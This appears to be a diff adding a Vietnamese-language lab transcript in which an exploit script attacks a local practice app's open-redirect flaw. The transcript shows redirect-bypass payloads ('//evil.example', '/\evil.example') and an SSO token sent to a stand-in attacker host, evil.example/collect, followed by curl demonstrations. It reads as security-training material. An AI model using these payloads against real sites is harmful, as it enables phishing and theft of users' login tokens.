@@ -1,0 +1,32 @@
+# Transcript lab 6.3 - Open redirect
+# App: python3 app.py  (127.0.0.1:8059)
+# Chay: python3 exploit.py
+# Ngay chay that: 2026-10-18 17:29:33
+# ============================================================
+
+[*] Buoc 1: open redirect thuan /go?url=
+    [302] Location: https://evil.example/phishing-login
+    => nan nhan thay link toi 127.0.0.1:8059 (dang tin) nhung bi day
+       ra site gia evil.example
+
+[*] Buoc 2: vuot kiem 'chi URL noi bo' o /login?next=
+    next=/dashboard             [302] Location: /dashboard                   noi bo (OK that su)
+    next=//evil.example/phishing [302] Location: //evil.example/phishing      RA NGOAI!
+    next=/\evil.example         [302] Location: /%5Cevil.example             RA NGOAI!
+
+[*] Buoc 3: ro ri token SSO qua next mo
+    [302] Location: https://evil.example/collect?token=FLAG%7B6.3_open_redirect_ro_ri_token%7D
+    Location (da giai ma): https://evil.example/collect?token=FLAG{6.3_open_redirect_ro_ri_token}
+    => token roi vao tay attacker: FLAG{6.3_open_redirect_ro_ri_token}
+
+[+] Open redirect xac nhan. FLAG = FLAG{6.3_open_redirect_ro_ri_token}
+
+# (exploit exit code: 0)
+
+# --- Minh hoa them bang curl (xem header Location, khong di theo) ---
+$ curl -s -i 'localhost:8059/go?url=https://evil.example/phish' | grep -i -E 'HTTP/|^location'
+HTTP/1.1 302 FOUND
+Location: https://evil.example/phish
+$ curl -s -i 'localhost:8059/sso?next=https://evil.example/collect' | grep -i -E 'HTTP/|^location'
+HTTP/1.1 302 FOUND
+Location: https://evil.example/collect?token=FLAG%7B6.3_open_redirect_ro_ri_token%7D
